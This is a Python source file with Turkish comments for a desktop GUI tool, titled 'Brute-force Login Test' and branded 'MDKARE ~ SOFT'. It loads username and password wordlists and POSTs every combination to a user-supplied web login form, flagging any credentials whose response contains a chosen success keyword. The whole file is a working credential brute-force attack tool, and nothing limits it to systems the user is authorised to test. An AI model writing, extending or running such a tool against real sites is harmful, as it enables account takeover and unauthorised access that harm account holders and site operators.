import tkinter as tk
from tkinter import filedialog, messagebox
import requests
from colorama import Fore, Style, init
import time
import threading

# Colorama başlatma
init(autoreset=True)

# Durum bayrağı (iş parçacığını durdurmak için)
stop_flag = False

def post_data():
    global stop_flag
    stop_flag = False  # Durdurma bayrağını sıfırla
    
    # Kullanıcılardan alınan veriler
    url = url_entry.get().strip()

    # Eğer kullanıcı URL'yi protokolsüz girdiyse, otomatik olarak 'http://' ekleyelim
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    success_keyword = success_keyword_entry.get()  # Başarı anahtarını al

    usernames = user_text.get("1.0", "end-1c").splitlines()  # Kullanıcı adlarını al
    passwords = pass_text.get("1.0", "end-1c").splitlines()  # Şifreleri al

    form_username_key = form_username_key_entry.get()  # Kullanıcı adı form elemanı
    form_password_key = form_password_key_entry.get()  # Şifre form elemanı

    # Brute-force login testi
    result_text.delete(1.0, tk.END)  # Önceki sonuçları temizle
    update_result(f"--- Brute-force Login Test Başlatılıyor ---\n", "info")

    # Bu işlemi ayrı bir iş parçacığında çalıştırmak için başlatıyoruz
    threading.Thread(target=brute_force_login, args=(url, success_keyword, usernames, passwords, form_username_key, form_password_key)).start()

def brute_force_login(url, success_keyword, usernames, passwords, form_username_key, form_password_key):
    global stop_flag
    for username in usernames:
        if stop_flag:
            update_result(f"{Fore.YELLOW}Test durduruldu.\n", "info")
            return
        
        for password in passwords:
            if stop_flag:
                update_result(f"{Fore.YELLOW}Test durduruldu.\n", "info")
                return
            
            # Form verilerini ayarla
            data = {
                form_username_key: username,
                form_password_key: password
            }

            # POST isteği gönder
            try:
                response = requests.post(url, data=data)
                if success_keyword in response.text:
                    # Şifre yakalandı bildirimi
                    update_result(f"{Fore.GREEN}[BAŞARILI] Kullanıcı adı: {username} | Şifre: {password}\n", "success")
                    update_result(f"{Fore.BLUE}Yanıt Kodu: {response.status_code}\n", "info")
                    update_result(f"Sunucudan Yanıt:\n{response.text[:500]}\n", "info")
                    
                    # Mesaj kutusunda kullanıcıdan devam etme isteği
                    devam = messagebox.askyesno("Şifre Yakalandı!", f"Doğru şifre bulundu!\nKullanıcı Adı: {username}\nŞifre: {password}\nDevam etmek ister misiniz?")
                    
                    if not devam:
                        stop_flag = True
                        update_result("Test kullanıcı tarafından durduruldu.\n", "info")
                        return
                    else:
                        update_result("Devam ediliyor...\n", "info")
                    
                else:
                    update_result(f"{Fore.RED}[BAŞARISIZ] Kullanıcı adı: {username} | Şifre: {password}\n", "failure")
                    update_result(f"{Fore.YELLOW}Yanıt Kodu: {response.status_code}\n", "info")
                    update_result(f"Sunucudan Yanıt:\n{response.text[:500]}\n", "info")
                    time.sleep(0.5)
            except requests.exceptions.RequestException as e:
                update_result(f"{Fore.RED}Hata: {str(e)}\n", "failure")
                return

    update_result(f"{Style.BRIGHT + Fore.YELLOW}\n--- Deneme tamamlandı ---\n", "info")

# GUI'deki metni güncelleyen bir fonksiyon
def update_result(message, message_type="info"):
    if message_type == "success":
        result_text.insert(tk.END, f"{message}\n", "success")
    elif message_type == "failure":
        result_text.insert(tk.END, f"{message}\n", "failure")
    else:
        result_text.insert(tk.END, f"{message}\n", "info")

    result_text.yview(tk.END)  # Sonuçları ekranın altına kaydır

def load_user_file():
    filepath = filedialog.askopenfilename(title="Kullanıcı Adı Dosyasını Seçin", filetypes=(("Text files", "*.txt"),))
    if filepath:
        with open(filepath, "r") as file:
            user_text.delete(1.0, tk.END)  # Önceki metni sil
            user_text.insert(tk.END, file.read())

def load_pass_file():
    filepath = filedialog.askopenfilename(title="Şifre Dosyasını Seçin", filetypes=(("Text files", "*.txt"),))
    if filepath:
        with open(filepath, "r") as file:
            pass_text.delete(1.0, tk.END)  # Önceki metni sil
            pass_text.insert(tk.END, file.read())

def stop_test():
    global stop_flag
    stop_flag = True  # Durdurma bayrağını True yaparak testi durdur

root = tk.Tk()

# Başlık ekle (en üste, ortalanmış)

root.title("Brute-force Login Test")
root.geometry("750x600")  # Pencere boyutunu daha geniş yapmak
# Başlık ekle (en üste, ortalanmış)
tk.Label(root, text="MDKARE ~ SOFT", font=('Arial', 20, 'bold'), fg='#2C3E50').grid(row=0, column=0, columnspan=2, pady=10)

# URL Girişi
tk.Label(root, text="Giriş URL'si:", font=('Arial', 12)).grid(row=1, column=0, padx=10, pady=5)
url_entry = tk.Entry(root, width=50, font=('Arial', 12))
url_entry.grid(row=1, column=1, padx=10, pady=5)

# Başarı Anahtarı Girişi
tk.Label(root, text="Başarı Anahtarı (success keyword):", font=('Arial', 12)).grid(row=2, column=0, padx=10, pady=5)
success_keyword_entry = tk.Entry(root, width=50, font=('Arial', 12))
success_keyword_entry.grid(row=2, column=1, padx=10, pady=5)

# Kullanıcı Adı Form Anahtarını Girişi
tk.Label(root, text="Kullanıcı Adı Form Değişkeni:", font=('Arial', 12)).grid(row=3, column=0, padx=10, pady=5)
form_username_key_entry = tk.Entry(root, width=50, font=('Arial', 12))
form_username_key_entry.grid(row=3, column=1, padx=10, pady=5)

# Şifre Form Anahtarını Girişi
tk.Label(root, text="Şifre Form Değişkeni:", font=('Arial', 12)).grid(row=4, column=0, padx=10, pady=5)
form_password_key_entry = tk.Entry(root, width=50, font=('Arial', 12))
form_password_key_entry.grid(row=4, column=1, padx=10, pady=5)

# Kullanıcı Adı Dosyasını Yükleme
tk.Button(root, text="Kullanıcı Adı Dosyasını Yükle", font=('Arial', 12), command=load_user_file, bg='#4CAF50', fg='white').grid(row=5, column=0, padx=10, pady=10)
user_text = tk.Text(root, height=6, width=50, font=('Arial', 12))
user_text.grid(row=5, column=1, padx=10, pady=10)

# Şifre Dosyasını Yükleme
tk.Button(root, text="Şifre Dosyasını Yükle", font=('Arial', 12), command=load_pass_file, bg='#FF5733', fg='white').grid(row=6, column=0, padx=10, pady=10)
pass_text = tk.Text(root, height=6, width=50, font=('Arial', 12))
pass_text.grid(row=6, column=1, padx=10, pady=10)

# Başlat butonu
tk.Button(root, text="Post Göndermeye Başla", font=('Arial', 14), command=post_data, bg='#008CBA', fg='white').grid(row=7, column=0, padx=10, pady=20)

# Durdurma butonu
tk.Button(root, text="Post Göndermeyi Durdur", font=('Arial', 14), command=stop_test, bg='#e74c3c', fg='white').grid(row=7, column=1, padx=10, pady=20)

# Sonuç metni
result_text = tk.Text(root, height=15, width=70, font=('Arial',12))
result_text.grid(row=8, column=0, columnspan=2, padx=10, pady=10)

# Sonuç metni için metin rengi ayarlama
result_text.tag_configure("success", foreground="green")
result_text.tag_configure("failure", foreground="red")
result_text.tag_configure("info", foreground="blue")

# Uygulamayı başlat
root.mainloop()

